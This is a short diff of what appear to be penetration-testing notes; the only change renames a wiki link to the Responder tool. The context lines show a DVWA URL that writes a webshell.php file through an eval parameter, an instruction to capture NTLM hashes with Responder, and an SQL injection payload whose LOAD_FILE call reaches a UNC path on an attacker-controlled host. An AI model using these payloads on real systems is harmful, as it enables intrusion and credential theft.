@@ -373,7 +373,7 @@ http://dvwa.local/dvwa/eval_php.php?evaluate=if(file_put_contents('webshell.php'
 
 TODO: Check the links in the references to check other ways to exploit UNC paths.
 
-- Run [[Responder|Responder]] to grab the NTLM hashes.
+- Run [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Sniffing and Spoofing/Passive/Responder|Responder]] to grab the NTLM hashes.
 
 ```sql
 ' UNION SELECT NULL, LOAD_FILE('\\\\<attacker_IP>\\snare.txt')#
